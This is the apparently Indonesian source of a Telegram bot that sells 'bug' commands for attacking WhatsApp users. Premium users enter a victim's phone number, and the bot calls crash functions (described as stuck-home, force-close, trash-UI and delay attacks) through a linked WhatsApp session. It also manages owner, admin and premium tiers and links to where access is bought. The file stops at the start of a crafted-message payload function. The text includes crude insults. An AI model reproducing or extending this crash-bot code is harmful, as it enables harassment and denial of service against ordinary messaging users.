/*

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

🩸  СКРИПТ : NORTSIDE INFINITY
🩸  ВЕРСИЯ : 1.3
🩸  РАЗРАБОТЧИК : KyzzOfficial

🌫️ Рождён в тумане холода...
🌑 Нашептан мраком ночи...
🕯️ И подчиняется лишь своему хозяину...

⚠️ Не трогай... если не готов принять проклятие.

📌 Telegram : https://t.me/KyzzOfficial

💀 Благодарности:
- Allah SWT
- Muhammad Saw
- KyzzOfficial 
- Melvin
- SevsBotz
- Khafa Jomok
- ChatGPT
- Верные пользователи

© Kyzzofficial – Все права поглощены тьмой

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

*/


const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const moment = require('moment-timezone');
const {
makeWASocket,
makeInMemoryStore,
fetchLatestBaileysVersion,
useMultiFileAuthState,
DisconnectReason,
generateWAMessageFromContent,
generateMessageID,
proto
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const crypto = require('crypto');
const axios = require("axios");
const { spawn } = require("child_process");
const { tmpdir } = require("os");
const { join } = require("path");
const { BOT_TOKEN } = require("./system/config");
const premiumFile = './system/database/premiumuser.json';
const ownerFile = './system/database/owneruser.json';
const adminFile = './system/database/adminuser.json';
const groupOnlyFile = './system/database/grouponly.json';
const cooldownUsers = new Map();

let bots = [];
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());
let kyzz = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6", "7", "82"];

const randomImages = [
"https://files.catbox.moe/i4qqsy.jpg",
"https://files.catbox.moe/lhxmmm.jpg",
"https://files.catbox.moe/w0527y.jpg",
"https://files.catbox.moe/yx2tej.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  
  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
  const rl = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });
  rl.question(query, (answer) => {
    rl.close();
    resolve(answer);
  });
});
// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();
  
  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder, you can change this or remove it
    }),
  };
  
  kyzz = makeWASocket(connectionOptions);
  
  kyzz.ev.on('creds.update', saveCreds);
  store.bind(kyzz.ev);
  
  kyzz.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'open') {
      kyzz.newsletterFollow("120363404855873617@newsletter")
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Connection')}
╰─────────────────────────────╯`));
  }
  
  if (connection === 'close') {
    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
    console.log(
    chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white.bold('Whatsapp Disconnected')}
╰─────────────────────────────╯`),
  shouldReconnect ? chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white.bold('Reconnecting Again')}
╰─────────────────────────────╯`) : ''
);
if (shouldReconnect) {
  startSesi();
}
isWhatsAppConnected = false;
}
});
}


const loadJSON = (file) => {
if (!fs.existsSync(file)) return [];
return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
if (!ownerUsers.includes(ctx.from.id.toString())) {
return ctx.reply("❌ [ Akses Di Tolak ] Bukan Developer Gausah Mainin");
}
next();
};

const checkAdmin = (ctx, next) => {
if (!adminUsers.includes(ctx.from.id.toString())) {
return ctx.reply("❌ [ Akses Di Tolak ] Lu Bukan Admin Tolol Buy Akses Ke @KyzzOfficial");
}
next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
if (!premiumUsers.includes(ctx.from.id.toString())) {
return ctx.reply("❌ [ Akses Di Tolak ] Gausah Di Mainin Khusus Premium Anjj Buy Akses Ke @KyzzOfficial");
}
next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
if (!adminList.includes(userId)) {
adminList.push(userId);
saveAdmins();
}
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
adminList = adminList.filter(id => id !== userId);
saveAdmins();
};


// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
try {
const data = fs.readFileSync('./admins.json');
adminList = JSON.parse(data);
} catch (error) {
console.error(chalk.red('Gagal memuat daftar admin:'), error);
adminList = [];
}
};

// Membaca status grup-only dari file (aktif/tidak)
let groupOnlyStatus = fs.existsSync(groupOnlyFile) ? JSON.parse(fs.readFileSync(groupOnlyFile)) : { enabled: false };

// Fungsi untuk menyimpan status mode grup ke file
function saveGroupOnly() {
fs.writeFileSync(groupOnlyFile, JSON.stringify(groupOnlyStatus, null, 2));
}

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
  
    const ProsesColi = `\`\`\`\n
┏───⦗ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ⦘────╮
│ STATUS : PROCESSING SENDING BUG. . .
│ NOTE : JEDA 5 MENIT KONTOL
│ BIAR GA KE BAND
╰────────────────────╯\`\`\`   `;

    await ctx.replyWithPhoto("https://files.catbox.moe/8lf2o3.png", {
      caption: ProsesColi,
      parse_mode: "Markdown"
    })
};

const donerespone = async (target, ctx) => {
  
    const SuksesCrot = `\`\`\`\n
╭───⦗ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ⦘────╮
│ STATUS : SUCCESFULLY SENDING BUG. . .
│ NOTE : JEDA 5 MENIT KONTOL
│ BIAR GA KE BAND
╰────────────────────╯
╭────────────────────╮
│ NORTSIDE INFINITY BT KYZZ
╰────────────────────╯\`\`\`
    `;

    await ctx.replyWithPhoto("https://files.catbox.moe/gpzw87.png", {
      caption: SuksesCrot,
      parse_mode: "Markdown"
    })
};

// Middleware untuk mengecek apakah bot hanya berjalan di grup/pribadi
const checkGroupOnly = (ctx, next) => {
const isGroup = ctx.chat.type.endsWith('group');

if (groupOnlyStatus.enabled && !isGroup) {
return ctx.reply("Group only kontol", { parse_mode: "Markdown" });
}
if (!groupOnlyStatus.enabled && isGroup) {
return ctx.reply("Private only kontol", { parse_mode: "Markdown" });
}

next();
};
// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
premiumUsers[userId] = {
expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
};
savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
delete premiumUsers[userId];
savePremiumUsers();
};
// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
const userData = premiumUsers[userId];
if (!userData) {
Premiumataubukan = "❌";
return false;
}

const now = moment().tz('Asia/Jakarta');
const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

if (now.isBefore(expirationDate)) {
Premiumataubukan = "✅";
return true;
} else {
Premiumataubukan = "❌";
return false;
}
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
try {
const data = fs.readFileSync('./premiumUsers.json');
premiumUsers = JSON.parse(data);
} catch (error) {
console.error(chalk.red('Gagal memuat data user premium:'), error);
premiumUsers = {};
}
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
╭⧽『 𝐄𝐑𝐑𝐎𝐑 』
│▢ Belum Terhubung, Bung.
│▢ Sistem menolak akses lu.
╰──────────────────╯

╭⧽『 𝐂𝐀𝐓𝐀𝐓𝐀𝐍 』
│▢ Gunakan perintah /addbot
│▢ Untuk mengakses fitur bug.
╰──────────────────╯
`);
return;
}
next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\
bot.command('start', checkGroupOnly, async (ctx) => {
  const userId = ctx.from.id.toString();

  if (blacklist.includes(userId)) {
    return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
  }

  const RandomBgtJir = getRandomImage();
  const waktuRunPanel = getUptime(); // Uptime panel
  const senderId = ctx.from.id;
  const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
  const id = ctx.from.id;
  const senderName = ctx.from.first_name ? `User: ${ctx.from.first_name}` : `User ID: ${senderId}`;

  await ctx.replyWithPhoto(RandomBgtJir, {
    caption: `\`\`\`
☰ Olaa ${senderName} こんにちは、NORTSIDEです。開発者KyzzOfficialによって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : NORTSIDE INFINITY
▢ Version : 1.5 — VIP
▢ Developer : @KyzzOfficial
▢ Developer 2 : @TEPZSTORE12
──────────────────
 ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪʙᴀᴡᴀʜ ɪɴɪ.
\`\`\`
`,
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('[ ぽぼアょ ]', 'bugmenu'),
        Markup.button.callback('[ ボネホプ ]', 'ownermenu'),
      ],
      [
        Markup.button.callback('[ ㇽㇶェゥ ]', 'toolsmenu'),
        Markup.button.callback('[ ボムプヰ ]', 'tqto'),
      ]
    ])
  });
});


bot.action('bugmenu', checkGroupOnly, async (ctx) => {
  const userId = ctx.from.id.toString();
  const senderName = ctx.from.first_name || 'User';
  const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
  const id = ctx.from.id;
  const waktuRunPanel = getUptime();

  if (blacklist.includes(userId)) {
    return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
  }

  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 BACK MENU', 'startback')],
  ]);

  const caption = `\`\`\`
☰ Olaa ${senderName} こんにちは、NORTSIDEです。開発者KyzzOfficialによって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : NORTSIDE INFINITY
▢ Version : 1.5 — VIP
▢ Developer : @KyzzOfficial
▢ Developer 2 : @TEPZSTORE12
──────────────────
—# B U G M E N U ⌯
▢ /kyzzstuckhome 𝟼𝟸𝚡𝚡
|[ STUCK HOME X FC ]|

▢ /kyzztrashui 𝟼𝟸𝚡𝚡
|[ TRASHZEP X UI ]|

▢ /kyzzinvictus 𝟼𝟸𝚡𝚡
|[ DRAIN DELAY INVIS ]|

▢ /kyzzcombine 𝟼𝟸𝚡𝚡
|[COMBINE FUNCT ]|
──────────────────
\`\`\``;

  await editMenu(ctx, caption, buttons, {
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  });
});

bot.action('ownermenu', checkGroupOnly, async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const id = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 BACK MENU', 'startback')],
  ]);

  const caption = `\`\`\`
( 🇷🇺 ) Olaa 👋 ${senderName} こんにちは、NORTSIDEです。開発者KyzzOfficialによって作成されました。ボットを賢く使用してください。

—# I N F O U S E R S ⌯
│▢ Username : ${username}
│▢ ID : ${id}
│▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
│▢ Script Name : NORTSIDE INFINITY
│▢ Version : 1.5 — VIP
│▢ Developer : @KyzzOfficial
▢ Developer 2 : @TEPZSTORE12
──────────────────
—# S E T T I N G S ⌯
│▢ /addbot 
│▢ /addadmin 
│▢ /deladmin 
│▢ /addprem 
│▢ /delprem 
│▢ /addowner 
│▢ /delowner
│▢ /listowner 
│▢ /listadmin 
│▢ /listprem
──────────────────
\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('toolsmenu', checkGroupOnly, async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const id = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 BACK MENU', 'startback')],
  ]);

  const caption = `\`\`\`
☰ Olaa ${senderName} こんにちは、NORTSIDEです。開発者KyzzOfficialによって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : NORTSIDE INFINITY
▢ Version : 1.5 — VIP
▢ Developer : @KyzzOfficial
▢ Developer 2 : @TEPZSTORE12
──────────────────
—# T O O L S ⌯
▢ /cekid
▢ /delsesi
▢ /grouponly on/off
──────────────────
\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('tqto', checkGroupOnly, async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const id = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 BACK MENU', 'startback')],
  ]);

  const caption = `\`\`\`
☰ Olaa ${senderName} こんにちは、NORTSIDEです。開発者KyzzOfficialによって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : NORTSIDE INFINITY
▢ Version : 1.5 — VIP
▢ Developer : @KyzzOfficial
▢ Developer 2 : @TEPZSTORE12
──────────────────
—# C R E D I T S ⌯
▢ ᴋʏᴢᴢᴏғғɪᴄɪᴀʟ - ᴅᴇᴠᴇʟᴏᴘᴇʀ
▢ ᴛᴇᴘᴢᴏғғɪᴄɪᴀʟ - ᴅᴇᴠᴇʟᴏᴘᴇʀ 𝟸
▢ ᴍᴇʟᴠɪɴ - ʙᴀsᴇ
▢ sᴇᴠsʙᴏᴛᴢ - ғʀᴇɪɴᴅs
▢ ᴋʜᴀғᴀ - ᴋɪɴɢ ᴊᴏᴍᴏᴋ
▢ ᴠᴀɴᴢ - ғʀɪᴇɴᴅ
▢ ᴘᴀɴᴢʙᴏᴛ - ғʀᴇɪɴᴅs
▢ ɪᴋɪ - ʙᴇsᴛ ғʀɪᴇɴᴅ
▢ ᴀɪᴍ - ᴀᴄɪᴋɪᴡɪʀ
▢ ᴋɪɪ - ɪᴄɪᴋɪᴡɪʀ
▢ ɪᴋʏʏ - ᴋᴀɴɢ ʙᴏᴛ
──────────────────
\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('startback', checkGroupOnly, async (ctx) => {
 const userId = ctx.from.id.toString();
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const id = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('[ ぽぼアょ ]', 'bugmenu'),
             Markup.button.callback('[ ボネホプ ]', 'ownermenu'),
         ],
         [
             
             Markup.button.callback('[ ㇽㇶェゥ ]', 'toolsmenu'),
             Markup.button.callback('[ ボムプヰ ]', 'tqto'),
         ]
]);

  const caption = `\`\`\`
☰ Olaa ${senderName} こんにちは、NORTSIDEです。開発者KyzzOfficialによって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : NORTSIDE INFINITY
▢ Version : 1.5 — VIP
▢ Developer : @KyzzOfficial
▢ Developer 2 : @TEPZSTORE12
──────────────────
\`\`\``;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~//
bot.command("kyzzstuckhome", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/kyzzstuckhome 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
    await InvisibleFC(target);
    }

   await donerespone(target, ctx);
});

bot.command("kyzztrashui", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/kyzztrashui 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
    await InvisForce(target);
    }

   await donerespone(target, ctx);
});
bot.command("kyzzinvictus", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/kyzzinvictus 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
    await DelayInvisible(target);
    }

   await donerespone(target, ctx);
});
bot.command("kyzzcombine", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/kyzzcombine 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
    await TrashCombi(target);
    }

   await donerespone(target, ctx);
});
//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\
// ====== Helper Function ======
const formatList = (arr, title) =>
  arr.length
    ? `📋 *Daftar ${title}:*\n` + arr.map((id, i) => `${i + 1}. \`${id}\``).join("\n")
    : `📛 Tidak ada ${title.toLowerCase()} yang terdaftar.`;

// ====== Add Premium ======
bot.command('addprem', checkGroupOnly, checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID pengguna.\nContoh: /addprem 123456789");

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} sudah berstatus Premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `🎉 Akses Premium berhasil diberikan!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `🚀 Sekarang memiliki akses penuh fitur eksklusif.`
  );
});

// ====== Delete Premium ======
bot.command('delprem', checkGroupOnly, checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID pengguna.\nContoh: /delprem 123456789");

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} tidak ditemukan dalam daftar Premium.`);
  }

  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `🚫 Akses Premium dicabut!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `❌ Telah dihapus dari daftar Premium.`
  );
});

// ====== Add Owner ======
bot.command('addowner', checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID user.\nContoh: /addowner 123456789");

  if (ownerUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} sudah terdaftar sebagai Owner.`);
  }

  ownerUsers.push(userId);
  saveJSON(ownerFile, ownerUsers);

  return ctx.reply(
    `👑 Akses Owner diberikan!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `🔐 Sekarang memiliki contorol penuh terhadap bot.`
  );
});

// ====== Delete Owner ======
bot.command('delowner', checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID user.\nContoh: /delowner 123456789");

  if (!ownerUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} tidak ditemukan dalam daftar Owner.`);
  }

  if (ctx.from.id.toString() === userId) {
    return ctx.reply("⚠️ Kamu tidak bisa menghapus dirimu sendiri dari daftar Owner.");
  }

  ownerUsers = ownerUsers.filter(id => id !== userId);
  saveJSON(ownerFile, ownerUsers);

  return ctx.reply(
    `🗑️ Akses Owner dicabut!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `🚫 Telah dihapus dari daftar Owner.`
  );
});

// ====== Add Admin ======
bot.command('addadmin', checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID pengguna.\nContoh: /addadmin 123456789");

  if (adminUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} sudah menjadi Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(
    `🔥 Akses Admin diberikan!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `⚙️ Sekarang memiliki hak control admin bot.`
  );
});

// ====== Delete Admin ======
bot.command('deladmin', checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID pengguna.\nContoh: /deladmin 123456789");

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} tidak ditemukan dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter(id => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(
    `🗑️ Akses Admin dicabut!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `🚫 Telah dihapus dari daftar Admin.`
  );
});

// ====== List Commands ======
bot.command('listprem', checkGroupOnly, checkOwner, (ctx) => {
  ctx.replyWithMarkdown(formatList(premiumUsers, "Premium"));
});

bot.command('listadmin', checkGroupOnly, checkOwner, (ctx) => {
  ctx.replyWithMarkdown(formatList(adminUsers, "Admin"));
});

bot.command('listowner', checkGroupOnly, checkOwner, (ctx) => {
  ctx.replyWithMarkdown(formatList(ownerUsers, "Owner"));
});


// 🧾 INFO COMMANDS
// Fungsi escape karakter khusus MarkdownV2
function escapeMarkdown(text) {
return text
.replace(/_/g, "\\_")
.replace(/\*/g, "\\*")
.replace(/\[/g, "\\[")
.replace(/`/g, "\\`")
.replace(/\(/g, "\\(")
.replace(/\)/g, "\\)")
.replace(/~/g, "\\~")
.replace(/>/g, "\\>")
.replace(/#/g, "\\#")
.replace(/\+/g, "\\+")
.replace(/-/g, "\\-")
.replace(/=/g, "\\=")
.replace(/\|/g, "\\|")
.replace(/\{/g, "\\{")
.replace(/\}/g, "\\}")
.replace(/\./g, "\\.")
.replace(/!/g, "\\!");
}

bot.command("cekid", async (ctx) => {
try {
const args = ctx.message.text.split(" ");
const target = args[1];
let user;

if (ctx.message.reply_to_message) {
user = ctx.message.reply_to_message.from;
} else if (target && target.startsWith("@")) {
user = await ctx.telegram.getChat(target);
} else {
user = ctx.from;
}

const name = `${user.first_name || ""} ${user.last_name || ""}`.trim();
const username = user.username ? `@${user.username}` : "-";
const userId = user.id;
const tanggal = moment().format("YYYY-MM-DD");

const text = `*╭━⧽『 INFO DATA USERS 』*
│👤 *Nama* : ${escapeMarkdown(name || "-")}
│🆔 *User ID* : \`${userId}\`
│🌐 *Username* : ${escapeMarkdown(username)}
│📅 *Tanggal* : ${escapeMarkdown(tanggal)}
*╰────────────╯*
_Beli Script Langsung Ke Bawah_`;

const buttons = [];

if (user.username) {
buttons.push([
Markup.button.url("Click Here", `https://t.me/KyzzOfficial`)
]);
}

await ctx.reply(text, {
parse_mode: "MarkdownV2",
reply_markup: {
inline_keyboard: buttons
}
});

} catch (e) {
console.error(e);
return ctx.reply("❌ Tidak bisa mengambil data. Pastikan username atau target valid dan sudah pernah chat dengan bot.");
}
});

bot.command("grouponly", checkAdmin, checkGroupOnly, async (ctx) => {
const arg = ctx.message.text.split(" ")[1];
if (!arg || !["on", "off"].includes(arg)) {
return ctx.reply("Example:\n:/grouponly on\n/grouponly off");
}

groupOnlyStatus.enabled = arg === "on";
saveGroupOnly();

return ctx.reply(`grouponly mode now *${groupOnlyStatus.enabled ? "active group only" : "inactive private only"}*`, { parse_mode: "Markdown" });
});

bot.command("delsesi", checkGroupOnly, checkOwner, checkAdmin, async (ctx) => {

try {
await fs.promises.rm('./session', { recursive: true, force: true });
WhatsAppConnected = false;
await ctx.reply('✅ Session Berhasil dihapus!');
startSesi();
} catch (error) {
await ctx.reply('❌ Gagal menghapus session!');
}
});

// Command untuk pairing WhatsApp
bot.command("addbot", checkOwner, checkGroupOnly, async (ctx) => {
const args = ctx.message.text.split(" ");
const userId = ctx.from.id;
if (args.length < 2) {
return await ctx.reply("❌ Format perintah salah. Gunakan: /addbot <628xxx>");
}

let phoneNumber = args[1];
phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


if (kyzz && kyzz.user) {
return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
}

try {
const code = await kyzz.requestPairingCode(phoneNumber, "NORTSIDE");
const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

const pairingMessage = `
\`\`\`Succesfully
Kode Pairing Kamu

Sender : ${phoneNumber}
Code : ${formattedCode}\`\`\`
`;

await ctx.replyWithMarkdown(pairingMessage);
} catch (error) {
console.error(chalk.red('Gagal melakukan pairing:'), error);
await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
}
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
pm2.connect((err) => {
if (err) {
console.error('Gagal terhubung ke PM2:', err);
return;
}

pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
pm2.disconnect(); // Putuskan koneksi setelah restart
if (err) {
console.error('Gagal merestart bot:', err);
} else {
console.log('Bot berhasil direstart.');
}
});
});
};

//~~~~~~~~~~~~~~~~~ FUNC BUG ~~~~~~~~~~~~~~~~~~\\
function delay(ms) {
return new Promise((resolve) => setTimeout(resolve, ms));
}

async function TripXMed(target) {
  for (let r = 0; r < 1; r++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
           messageContextInfo: {
            deviceListMetadata: {}, 
            deviceListMetaeataVersion: 2,
            messageSecret: crypto.randomBytes(25), 
            supportPayload: {
